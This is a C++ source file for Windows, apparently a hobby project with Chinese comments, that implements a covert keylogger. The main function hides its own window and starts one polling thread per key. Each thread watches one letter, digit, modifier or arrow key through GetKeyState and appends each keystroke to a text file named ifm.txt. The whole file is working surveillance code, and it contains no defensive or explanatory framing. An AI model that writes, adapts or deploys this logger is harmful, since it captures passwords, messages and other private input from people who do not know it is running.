#include <iostream>
#include <conio.h>
#include <windows.h>
#include <fstream>
#include <tchar.h>
#include <ctime> 

//#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )

using namespace std;
//声明

int symbol[70] = { 0 };
int b = 0;
//变量声明
int Kwrite(char a)
{
	ofstream outfile;
	outfile.open("ifm.txt", ios::out | ios::app);
	outfile << a;
	outfile.close();
	return 0;
}


//normal:
int key_w()
{
	while (1)
	{
		if (GetKeyState(87) != -127 && GetKeyState(87) != symbol[0] && GetKeyState(87) != -128)
		{
			Kwrite('w');
			symbol[0] = GetKeyState(87);
		}
		Sleep(2);
	}
	return 87;
}
int key_q()
{
	while (1)
	{
		if (GetKeyState(81) != -127 && GetKeyState(81) != symbol[1] && GetKeyState(81) != -128)
		{
			Kwrite('q');
			symbol[1] = GetKeyState(81);
		}
		Sleep(2);
	}
	return 81;
}
int key_e()
{
	while (1)
	{
		if (GetKeyState(69) != -128 && GetKeyState(69) != symbol[2] && GetKeyState(69) != -127)
		{
			Kwrite('e');
			symbol[2] = GetKeyState(69);
		}
		Sleep(2);
	}
	return 69;
}
int key_r()
{
	while (1)
	{
		if (GetKeyState(82) != -127 && GetKeyState(82) != symbol[3] && GetKeyState(82) != -128)
		{
			Kwrite('r');
			symbol[3] = GetKeyState(82);
		}
		Sleep(2);
	}
	return 82;
}
int key_t()
{
	while (1)
	{
		if (GetKeyState(84) != -127 && GetKeyState(84) != symbol[4] && GetKeyState(84) != -128)
		{
			Kwrite('t');
			symbol[4] = GetKeyState(84);
		}
		Sleep(2);
	}
	return 84;
}
int key_y()
{

	while (1)
	{
		if (GetKeyState(89) != -127 && GetKeyState(89) != symbol[5] && GetKeyState(89) != -128)
		{
			Kwrite('y');
			symbol[5] = GetKeyState(89);
		}
		Sleep(2);
	}
	return 89;
}
int key_u()
{
	while (1)
	{
		if (GetKeyState(85) != -127 && GetKeyState(85) != symbol[6] && GetKeyState(85) != -128)
		{
			Kwrite('u');
			symbol[6] = GetKeyState(85);
		}
		Sleep(2);
	}
	return 85;
}
int key_i()
{

	while (1)
	{
		if (GetKeyState(73) != -127 && GetKeyState(73) != symbol[7] && GetKeyState(73) != -128)
		{
			Kwrite('i');
			symbol[7] = GetKeyState(73);
		}
		Sleep(2);
	}
	return 73;
}
int key_o()
{
	while (1)
	{
		if (GetKeyState(79) != -127 && GetKeyState(79) != symbol[8] && GetKeyState(79) != -128)
		{
			Kwrite('o');
			symbol[8] = GetKeyState(79);
		}
		Sleep(2);
	}
	return 79;
}
int key_p()
{
	while (1)
	{
		if (GetKeyState(80) != -127 && GetKeyState(80) != symbol[9] && GetKeyState(80) != -128)
		{
			Kwrite('p');
			symbol[9] = GetKeyState(80);
		}
		Sleep(2);
	}
	return 80;
}
int key_a()
{
	while (1)
	{
		if (GetKeyState(65) != -127 && GetKeyState(65) != symbol[10] && GetKeyState(65) != -128)
		{
			Kwrite('a');
			symbol[10] = GetKeyState(65);
		}
		Sleep(2);
	}
	return 65;
}
int key_s()
{
	while (1)
	{
		if (GetKeyState(83) != -127 && GetKeyState(83) != symbol[11] && GetKeyState(83) != -128)
		{
			Kwrite('s');
			symbol[11] = GetKeyState(83);
		}
		Sleep(2);
	}
	return 83;
}
int key_d()
{
	while (1)
	{
		if (GetKeyState(68) != -127 && GetKeyState(68) != symbol[12] && GetKeyState(68) != -128)
		{
			Kwrite('d');
			symbol[12] = GetKeyState(68);
		}
		Sleep(2);
	}
	return 68;
}
int key_f()
{
	while (1)
	{
		if (GetKeyState(70) != -127 && GetKeyState(70) != symbol[13] && GetKeyState(70) != -128)
		{
			Kwrite('f');
			symbol[13] = GetKeyState(70);
		}
		Sleep(2);
	}
	return 70;
}
int key_g()
{
	while (1)
	{
		if (GetKeyState(71) != -127 && GetKeyState(71) != symbol[14] && GetKeyState(71) != -128)
		{
			Kwrite('g');
			symbol[14] = GetKeyState(71);
		}
		Sleep(2);
	}
	return 71;
}
int key_h()
{
	while (1)
	{
		if (GetKeyState(72) != -127 && GetKeyState(72) != symbol[15] && GetKeyState(72) != -128)
		{
			Kwrite('h');
			symbol[15] = GetKeyState(72);
		}
		Sleep(2);
	}
	return 72;
}
int key_j()
{
	while (1)
	{
		if (GetKeyState(74) != -127 && GetKeyState(74) != symbol[16] && GetKeyState(74) != -128)
		{
			Kwrite('j');
			symbol[16] = GetKeyState(74);
		}
		Sleep(2);
	}
	return 74;
}
int key_k()
{
	while (1)
	{
		if (GetKeyState(75) != -127 && GetKeyState(75) != symbol[17] && GetKeyState(75) != -128)
		{
			Kwrite('k');
			symbol[17] = GetKeyState(75);
		}
		Sleep(2);
	}
	return 75;
}
int key_l()
{
	while (1)
	{
		if (GetKeyState(76) != -127 && GetKeyState(76) != symbol[18] && GetKeyState(76) != -128)
		{
			Kwrite('l');
			symbol[18] = GetKeyState(76);
		}
		Sleep(2);
	}
	return 76;
}
int key_z()
{
	while (1)
	{
		if (GetKeyState(90) != -127 && GetKeyState(90) != symbol[19] && GetKeyState(90) != -128)
		{
			Kwrite('z');
			symbol[19] = GetKeyState(90);
		}
		Sleep(2);
	}
	return 81;
}
int key_x()
{
	while (1)
	{
		if (GetKeyState(88) != -127 && GetKeyState(88) != symbol[20] && GetKeyState(88) != -128)
		{
			Kwrite('x');
			symbol[20] = GetKeyState(88);
		}
		Sleep(2);
	}
	return 88;
}
int key_c()
{
	while (1)
	{
		if (GetKeyState(67) != -127 && GetKeyState(67) != symbol[21] && GetKeyState(67) != -128)
		{
			Kwrite('c');
			symbol[21] = GetKeyState(67);
		}
		Sleep(2);
	}
	return 67;
}
int key_v()
{
	while (1)
	{
		if (GetKeyState(86) != -127 && GetKeyState(86) != symbol[22] && GetKeyState(86) != -128)
		{
			Kwrite('v');
			symbol[22] = GetKeyState(86);
		}
		Sleep(2);
	}
	return 86;
}
int key_b()
{
	while (1)
	{
		if (GetKeyState(66) != -127 && GetKeyState(66) != symbol[23] && GetKeyState(66) != -128)
		{
			Kwrite('b');
			symbol[23] = GetKeyState(66);
		}
		Sleep(2);
	}
	return 66;
}
int key_n()
{
	while (1)
	{
		if (GetKeyState(78) != -127 && GetKeyState(78) != symbol[24] && GetKeyState(78) != -128)
		{
			Kwrite('n');
			symbol[24] = GetKeyState(78);
		}
		Sleep(2);
	}
	return 78;
}
int key_m()
{
	while (1)
	{
		if (GetKeyState(77) != -127 && GetKeyState(77) != symbol[25] && GetKeyState(77) != -128)
		{
			Kwrite('m');
			symbol[25] = GetKeyState(77);
		}
		Sleep(2);
	}
	return 77;
}
int key_1()
{
	while (1)
	{
		if (GetKeyState(49) != -127 && GetKeyState(49) != symbol[26] && GetKeyState(49) != -128)
		{
			Kwrite('1');
			symbol[26] = GetKeyState(49);
		}
		Sleep(2);
	}
	return 49;
}
int key_2()
{
	while (1)
	{
		if (GetKeyState(50) != -127 && GetKeyState(50) != symbol[27] && GetKeyState(50) != -128)
		{
			Kwrite('2');
			symbol[27] = GetKeyState(50);
		}
		Sleep(2);
	}
	return 50;
}
int key_3()
{
	while (1)
	{
		if (GetKeyState(51) != -127 && GetKeyState(51) != symbol[28] && GetKeyState(51) != -128)
		{
			Kwrite('3');
			symbol[28] = GetKeyState(51);
		}
		Sleep(2);
	}
	return 51;
}
int key_4()
{
	while (1)
	{
		if (GetKeyState(52) != -127 && GetKeyState(52) != symbol[29] && GetKeyState(52) != -128)
		{
			Kwrite('4');
			symbol[29] = GetKeyState(52);
		}
		Sleep(2);
	}
	return 52;
}
int key_5()
{
	while (1)
	{
		if (GetKeyState(53) != -127 && GetKeyState(53) != symbol[30] && GetKeyState(53) != -128)
		{
			Kwrite('5');
			symbol[30] = GetKeyState(53);
		}
		Sleep(2);
	}
	return 53;
}
int key_6()
{
	while (1)
	{
		if (GetKeyState(54) != -127 && GetKeyState(54) != symbol[31] && GetKeyState(54) != -128)
		{
			Kwrite('6');
			symbol[31] = GetKeyState(54);
		}
		Sleep(2);
	}
	return 54;
}
int key_7()
{
	while (1)
	{
		if (GetKeyState(55) != -127 && GetKeyState(55) != symbol[32] && GetKeyState(55) != -128)
		{
			Kwrite('7');
			symbol[32] = GetKeyState(55);
		}
		Sleep(2);
	}
	return 55;
}
int key_8()
{
	while (1)
	{
		if (GetKeyState(56) != -127 && GetKeyState(56) != symbol[33] && GetKeyState(56) != -128)
		{
			Kwrite('8');
			symbol[33] = GetKeyState(56);
		}
		Sleep(2);
	}
	return 56;
}
int key_9()
{
	while (1)
	{
		if (GetKeyState(57) != -127 && GetKeyState(57) != symbol[34] && GetKeyState(57) != -128)
		{
			Kwrite('9');
			symbol[34] = GetKeyState(57);
		}
		Sleep(2);
	}
	return 57;
}
int key_0()
{
	while (1)
	{
		if (GetKeyState(48) != -127 && GetKeyState(48) != symbol[35] && GetKeyState(48) != -128)
		{
			Kwrite('0');
			symbol[35] = GetKeyState(48);
		}
		Sleep(2);
	}
	return 58;
}//
//special:
int key_shift()
{
	while (1)
	{
		if (GetKeyState(16) != 0 && GetKeyState(16) != symbol[36] && GetKeyState(16) != 1)
		{
			Kwrite('(');
			Kwrite('s');
			Kwrite(')');
			symbol[36] = GetKeyState(16);
		}
		Sleep(2);
	}
	return 16;
}
int key_ENTER()
{
	while (1)
	{
		if (GetKeyState(13) != -127 && GetKeyState(13) != symbol[37] && GetKeyState(13) != -128)
		{
			Kwrite('{');
			Kwrite('E');
			Kwrite('}');
			symbol[37] = GetKeyState(13);
		}
		Sleep(2);
	}
	return 13;
}//
int key_L_lean()
{
	while (1)
	{
		if (GetKeyState(191) != -127 && GetKeyState(191) != symbol[38] && GetKeyState(191) != -128)
		{
			Kwrite('/');
			symbol[38] = GetKeyState(191);
		}
		Sleep(2);
	}
	return 191;
}
int key_R_lean()
{
	while (1)
	{
		if (GetKeyState(220) != -127 && GetKeyState(220) != symbol[39] && GetKeyState(220) != -128)
		{
			Kwrite('|');
			symbol[39] = GetKeyState(220);
		}
		Sleep(2);
	}
	return 220;
}
int key_semicolon()
{
	while (1)
	{
		if (GetKeyState(186) != -127 && GetKeyState(186) != symbol[40] && GetKeyState(186) != -128)
		{
			Kwrite(':');
			Kwrite(';');
			symbol[40] = GetKeyState(186);
		}
		Sleep(2);
	}
	return 186;
}
int key_ctrl()
{
	while (1)
	{
		if (GetKeyState(17) != 0 && GetKeyState(17) != symbol[41] && GetKeyState(17) != 1)
		{
			Kwrite('{');
			Kwrite('C');
			Kwrite('}');
			symbol[41] = GetKeyState(17);
		}
		Sleep(2);
	}
	return 17;

}
int key_BackSpace()
{
	while (1)
	{
		if (GetKeyState(8) != -127 && GetKeyState(8) != symbol[42] && GetKeyState(8) != -128)
		{
			Kwrite('{');
			Kwrite('B');
			Kwrite('}');
			symbol[42] = GetKeyState(8);
		}
		Sleep(2);
	}
	return 8;
}
int key_Space()
{
	while (1)
	{
		if (GetKeyState(32) != -127 && GetKeyState(32) != symbol[43] && GetKeyState(32) != -128)
		{
			Kwrite('{');
			Kwrite('N');
			Kwrite('}');
			symbol[43] = GetKeyState(32);
		}
		Sleep(2);
	}
	return 32;
}
int key_Alt()
{
	while (1)
	{
		if (GetKeyState(18) != 0 && GetKeyState(18) != symbol[44] && GetKeyState(18) != 1)
		{
			Kwrite('{');
			Kwrite('A');
			Kwrite('}');
			symbol[44] = GetKeyState(18);
		}
		Sleep(2);
	}
	return 18;
}
int key_R_LArrow()
{
	while (1)
	{
		if (GetKeyState(190) != -127 && GetKeyState(190) != symbol[45] && GetKeyState(190) != -128)
		{
			Kwrite('>');
			Kwrite('.');
			symbol[45] = GetKeyState(190);
		}
		Sleep(2);
	}
	return 190;
}
int key_L_LArrow()
{
	while (1)
	{
		if (GetKeyState(188) != -127 && GetKeyState(188) != symbol[46] && GetKeyState(188) != -128)
		{
			Kwrite('<');
			Kwrite(',');
			symbol[46] = GetKeyState(188);
		}
		Sleep(2);
	}
	return 190;
}
int key_LArrow()
{
	while (1)
	{
		if (GetKeyState(37) != -127 && GetKeyState(37) != symbol[47] && GetKeyState(37) != -128)
		{
			Kwrite('{');
			Kwrite('L');
			Kwrite('}');
			symbol[47] = GetKeyState(37);
		}
		Sleep(2);
	}
	return 37;
}
int key_RArrow()
{
	while (1)
	{
		if (GetKeyState(39) != -127 && GetKeyState(39) != symbol[48] && GetKeyState(39) != -128)
		{
			Kwrite('{');
			Kwrite('R');
			Kwrite('}');
			symbol[48] = GetKeyState(39);
		}
		Sleep(2);
	}
	return 39;
}
int key_UArrow()
{
	while (1)
	{
		if (GetKeyState(38) != -127 && GetKeyState(38) != symbol[49] && GetKeyState(38) != -128)
		{
			Kwrite('{');
			Kwrite('U');
			Kwrite('}');
			symbol[49] = GetKeyState(38);
		}
		Sleep(2);
	}
	return 38;
}
int key_DArrow()
{
	while (1)
	{
		if (GetKeyState(40) != -127 && GetKeyState(40) != symbol[50] && GetKeyState(40) != -128)
		{
			Kwrite('{');
			Kwrite('D');
			Kwrite('}');
			symbol[50] = GetKeyState(40);
		}
		Sleep(2);
	}
	return 40;
}
//
int main()
{
	HWND hWnd = GetForegroundWindow();
	ShowWindow(hWnd, SW_HIDE);//隐藏窗口
	HANDLE thread_w = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)key_w, NULL, 0, NULL);//开始线程检测
	HANDLE thread_q = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)key_q, NULL, 0, NULL);
	HANDLE thread_e = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)key_e, NULL, 0, NULL);
	HANDLE thread_r = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)key_r, NULL, 0, NULL);
	HANDLE thread_t = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)key_t, NULL, 0, NULL);
	HANDLE thread_y = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)key_y, NULL, 0, NULL);
	HANDLE thread_u = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)key_u, NULL, 0, NULL);
	HANDLE thread_i = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)key_i, NULL, 0, NULL);
	HANDLE thread_o = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)key_o, NULL, 0, NULL);
	HANDLE thread_p = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)key_p, NULL, 0, NULL);
	HANDLE thread_a = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)key_a, NULL, 0, NULL);
	HANDLE thread_s = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)key_s, NULL, 0, NULL);
	HANDLE thread_d = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)key_d, NULL, 0, NULL);
	HANDLE thread_f = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)key_f, NULL, 0, NULL);
	HANDLE thread_g = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)key_g, NULL, 0, NULL);
	HANDLE thread_h = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)key_h, NULL, 0, NULL);
	HANDLE thread_j = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)key_j, NULL, 0, NULL);
	HANDLE thread_k = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)key_k, NULL, 0, NULL);
	HANDLE thread_l = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)key_l, NULL, 0, NULL);
	HANDLE thread_z = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)key_z, NULL, 0, NULL);
	HANDLE thread_x = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)key_x, NULL, 0, NULL);
	HANDLE thread_c = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)key_c, NULL, 0, NULL);
	HANDLE thread_v = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)key_v, NULL, 0, NULL);
	HANDLE thread_b = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)key_b, NULL, 0, NULL);
	HANDLE thread_n = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)key_n, NULL, 0, NULL);
	HANDLE thread_m = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)key_m, NULL, 0, NULL);
	HANDLE thread_1 = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)key_1, NULL, 0, NULL);
	HANDLE thread_2 = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)key_2, NULL, 0, NULL);
	HANDLE thread_3 = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)key_3, NULL, 0, NULL);
	HANDLE thread_4 = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)key_4, NULL, 0, NULL);
	HANDLE thread_5 = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)key_5, NULL, 0, NULL);
	HANDLE thread_6 = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)key_6, NULL, 0, NULL);
	HANDLE thread_7 = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)key_7, NULL, 0, NULL);
	HANDLE thread_8 = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)key_8, NULL, 0, NULL);
	HANDLE thread_9 = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)key_9, NULL, 0, NULL);
	HANDLE thread_0 = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)key_0, NULL, 0, NULL);
	HANDLE thread_shift = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)key_shift, NULL, 0, NULL);
	HANDLE thread_ENTER = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)key_ENTER, NULL, 0, NULL);
	HANDLE thread_L_lean = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)key_L_lean, NULL, 0, NULL);
	HANDLE thread_R_lean = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)key_R_lean, NULL, 0, NULL);
	HANDLE thread_semicolon = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)key_semicolon, NULL, 0, NULL);
	HANDLE thread_ctrl = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)key_ctrl, NULL, 0, NULL);
	HANDLE thread_BackSpace = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)key_BackSpace, NULL, 0, NULL);
	HANDLE thread_Space = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)key_Space, NULL, 0, NULL);
	HANDLE thread_R_LArrow = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)key_R_LArrow, NULL, 0, NULL);
	HANDLE thread_L_LArrow = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)key_L_LArrow, NULL, 0, NULL);
	HANDLE thread_LArrow = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)key_LArrow, NULL, 0, NULL);
	HANDLE thread_RArrow = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)key_RArrow, NULL, 0, NULL);
	HANDLE thread_UArrow = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)key_UArrow, NULL, 0, NULL);
	HANDLE thread_DArrow = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)key_DArrow, NULL, 0, NULL);
	HANDLE thread_Alt = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)key_Alt, NULL, 0, NULL);
	cin >> b;
}
